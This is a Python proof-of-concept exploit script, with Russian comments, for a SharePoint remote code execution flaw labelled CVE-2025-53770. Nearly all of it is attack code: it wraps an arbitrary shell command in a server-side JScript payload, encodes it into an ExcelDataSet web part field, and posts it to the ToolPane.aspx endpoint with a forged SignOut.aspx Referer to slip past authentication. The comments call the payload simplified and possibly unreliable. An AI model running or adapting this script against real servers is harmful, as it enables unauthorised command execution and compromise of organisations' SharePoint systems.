#!/usr/bin/env python3
"""
CVE-2025-53770 SharePoint RCE Exploit (PoC)
"""

import requests
import argparse
import base64
import sys
import zlib
import binascii
from requests.packages.urllib3.exceptions import InsecureRequestWarning

# Отключаем предупреждения о SSL сертификатах
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

def generate_payload(command):
    """
    Генерирует полезную нагрузку для выполнения команды.
    Это упрощенная версия, которая может работать не на всех системах.
    """
    try:
        # Создаем простую команду для выполнения
        cmd_line = f'cmd /c "{command}"'
        
        # Создаем минимальный payload в формате, который может быть распознан
        # Это сильно упрощенная версия реального payload
        payload_template = f'''<script language="JScript" runat="server">
function Page_Load() {{
    var proc = new System.Diagnostics.Process();
    proc.StartInfo.FileName = "cmd.exe";
    proc.StartInfo.Arguments = "/c {cmd_line}";
    proc.StartInfo.UseShellExecute = false;
    proc.StartInfo.RedirectStandardOutput = true;
    proc.Start();
    Response.Write(proc.StandardOutput.ReadToEnd());
    proc.WaitForExit();
}}
</script>'''
        
        # Сжимаем payload
        compressed_payload = zlib.compress(payload_template.encode('utf-8'))
        
        # Кодируем в base64
        encoded_payload = base64.b64encode(compressed_payload).decode('utf-8')
        return encoded_payload
        
    except Exception as e:
        print(f"[-] Ошибка генерации payload: {e}")
        sys.exit(1)

def exploit_sharepoint(url, command):
    """
    Пытается эксплуатировать CVE-2025-53770 на указанном URL.
    """
    # Добавляем протокол, если его нет
    if not url.startswith(('http://', 'https://')):
        url = 'https://' + url
    
    target_url = f"{url.rstrip('/')}/_layouts/15/ToolPane.aspx?DisplayMode=Edit&a=/ToolPane.aspx"
    
    # Генерация полезной нагрузки для команды
    print("[*] Генерация полезной нагрузки...")
    payload_b64 = generate_payload(command)
    print("[+] Полезная нагрузка сгенерирована.")
    
    # Критически важные заголовки
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
        'Referer': f'{url}/_layouts/SignOut.aspx',
        'Content-Type': 'application/x-www-form-urlencoded',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
        'Connection': 'close'
    }
    
    # Тело POST-запроса с вредоносной нагрузкой
    data = {
        'MSOTlPn_SelectedWpId': '1',
        'MSOTlPn_ShowSettings': 'False',
        'MSOTlPn_View': '0',
        'MSOTlPn_Uri': url,
        'MSOTlPn_DWP': f'''<asp:UpdateProgress ID="UpdateProgress1" DisplayAfter="10" runat="server" AssociatedUpdatePanelID="upTest">
  <ProgressTemplate>
    <div class="divWaiting">
      <Scorecard:ExcelDataSet CompressedDataTable="{payload_b64}" DataTable-CaseSensitive="false" runat="server"></Scorecard:ExcelDataSet>
    </div>
  </ProgressTemplate>
</asp:UpdateProgress>'''
    }

    try:
        print(f"[*] Цель: {target_url}")
        print(f"[*] Отправка вредоносного запроса с командой: {command}")
        print(f"[*] Использование обходного Referer: {headers['Referer']}")
        
        # Увеличиваем таймаут
        response = requests.post(target_url, 
                                headers=headers, 
                                data=data, 
                                verify=False, 
                                timeout=60)
        
        print(f"[*] Ответ получен. Код статуса: {response.status_code}")
        
        # Анализ ответа
        if response.status_code == 200:
            if "ExcelDataSet" in response.text or "CompressedDataTable" in response.text:
                print("[!] ВОЗМОЖНО УСПЕШНО! Сервер обработал вредоносный WebPart.")
                print("[!] Команда, скорее всего, выполнена. Проверьте целевой сервер.")
            elif "error" in response.text.lower():
                print("[-] Сервер вернул ошибку в ответе. Возможно, уязвимость отсутствует или патч применен.")
            else:
                print("[-] Сервер ответил 200 OK, но явных признаков успешной эксплуатации не обнаружено.")
        elif response.status_code == 500:
            print("[!] Сервер вернул Internal Server Error (500). Это МОЖЕТ быть признаком попытки выполнения payload.")
        elif response.status_code == 403:
            print("[-] Доступ запрещен (403). Возможно, WAF или брандмауэр заблокировали запрос.")
        elif response.status_code == 404:
            print("[-] Страница не найдена (404). Возможно, эндпоинт недоступен или сервер не является SharePoint.")
        else:
            print(f"[-] Сервер вернул неожиданный код статуса: {response.status_code}.")
            
        # Сохраняем ответ для дальнейшего анализа
        try:
            with open("response.html", "w", encoding="utf-8") as f:
                f.write(response.text)
            print("[*] Ответ сервера сохранен в файл response.html")
        except:
            print("[*] Не удалось сохранить ответ сервера в файл")
            
    except requests.exceptions.Timeout:
        print("[-] Таймаут при соединении/чтении. Сервер может быть недоступен, перегружен или WAF блокирует запрос.")
    except requests.exceptions.RequestException as e:
        print(f"[-] Ошибка сети при подключении к серверу: {e}")
    except Exception as e:
        print(f"[-] Произошла непредвиденная ошибка: {e}")

def main():
    parser = argparse.ArgumentParser(description="CVE-2025-53770 SharePoint RCE Exploit (ТОЛЬКО ДЛЯ ТЕСТИРОВАНИЯ С РАЗРЕШЕНИЯ)")
    parser.add_argument("url", help="Базовый URL целевого SharePoint сервера (например, http://sharepoint.example.com)")
    parser.add_argument("-c", "--command", required=True, help="Команда для выполнения на целевом сервере")
    
    args = parser.parse_args()
    
    print("="*60)
    print("CVE-2025-53770 SharePoint RCE Exploit (PoC)")
    print("="*60)
    
    exploit_sharepoint(args.url, args.command)

if __name__ == "__main__":
    main()